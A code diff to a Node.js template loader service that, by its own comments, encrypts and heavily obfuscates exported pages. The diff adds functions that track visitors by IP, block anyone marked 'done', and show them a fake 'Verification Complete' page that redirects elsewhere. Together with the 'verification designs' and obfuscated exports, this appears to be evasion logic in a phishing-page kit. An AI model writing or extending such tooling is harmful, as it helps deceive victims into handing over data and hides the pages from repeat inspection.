@@ -1,6 +1,6 @@
 /**
  * VGenius Template Loader Service
- * Encrypts exported templates using AES-GCM (like decrypt.html competitor)
+ * Encrypts exported templates using AES-GCM
  * Keeps heavy XOR obfuscation for JavaScript engines.
  */
 'use strict';
@@ -146,6 +146,100 @@ function loadVerificationDesignHTML(designName) {
 function hasVerificationDesignHTML(designName) {
     const result = loadVerificationDesignHTML(designName);
     return result.hasHtml;
+}
+
+// ─── Visitor Access Settings ───────────────────────────────
+async function getVisitorAccessSettings(userId) {
+    try {
+        const db = require('../database/connection');
+        const [rows] = await db.query(
+            'SELECT block_done_visitors, redirect_url FROM visitor_settings WHERE user_id = ?',
+            [userId]
+        );
+        if (rows.length) {
+            return {
+                blockDoneVisitors: rows[0].block_done_visitors == 1,
+                redirectUrl: rows[0].redirect_url || ''
+            };
+        }
+        return { blockDoneVisitors: false, redirectUrl: '' };
+    } catch (e) {
+        return { blockDoneVisitors: false, redirectUrl: '' };
+    }
+}
+
+async function checkVisitorBlocked(ipAddress, userId) {
+    try {
+        const settings = await getVisitorAccessSettings(userId);
+        if (!settings.blockDoneVisitors) return { blocked: false };
+
+        const db = require('../database/connection');
+        const [rows] = await db.query(
+            'SELECT status FROM visitors WHERE ip_address = ? AND user_id = ? ORDER BY created_at DESC LIMIT 1',
+            [ipAddress, userId]
+        );
+
+        if (rows.length && rows[0].status === 'done') {
+            return {
+                blocked: true,
+                redirectUrl: settings.redirectUrl
+            };
+        }
+        return { blocked: false };
+    } catch (e) {
+        return { blocked: false };
+    }
+}
+
+function buildBlockedPage(redirectUrl) {
+    if (redirectUrl) {
+        return `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Verification Complete</title>
+    <style>
+        body { margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #0b0b0b; font-family: 'Segoe UI', sans-serif; }
+        .container { text-align: center; color: #c6ffdd; }
+        .icon { font-size: 48px; margin-bottom: 16px; }
+        h1 { font-size: 24px; margin-bottom: 8px; }
+        p { color: #88ffaa; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">✅</div>
+        <h1>Verification Complete</h1>
+        <p>You have already completed verification. Redirecting...</p>
+    </div>
+    <script>window.location.replace("${redirectUrl.replace(/"/g, '\\\\"')}");<\/script>
+</body>
+</html>`;
+    } else {
+        return `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Verification Complete</title>
+    <style>
+        body { margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #0b0b0b; font-family: 'Segoe UI', sans-serif; }
+        .container { text-align: center; color: #c6ffdd; max-width: 400px; padding: 20px; }
+        .icon { font-size: 48px; margin-bottom: 16px; }
+        h1 { font-size: 24px; margin-bottom: 8px; }
+        p { color: #88ffaa; font-size: 14px; line-height: 1.5; }
+        .badge { display: inline-block; background: rgba(0,255,102,0.1); border: 1px solid rgba(0,255,102,0.3); border-radius: 12px; padding: 4px 12px; font-size: 11px; color: #00ff66; margin-top: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">✅</div>
+        <h1>Verification Complete</h1>
+        <p>You have already completed the verification for this document. No further action is required.</p>
+        <div class="badge">STATUS: COMPLETED</div>
+    </div>
+</body>
+</html>`;
+    }
 }
 
 // ─── Admin Settings ────────────────────────────────────────
@@ -707,6 +801,9 @@ module.exports = {
     buildSliderOverlay,
     loadAdminSettings,
     boolSetting,
+    getVisitorAccessSettings,
+    checkVisitorBlocked,
+    buildBlockedPage,
     generateExportHtml,
     buildWorkerScript,
 };
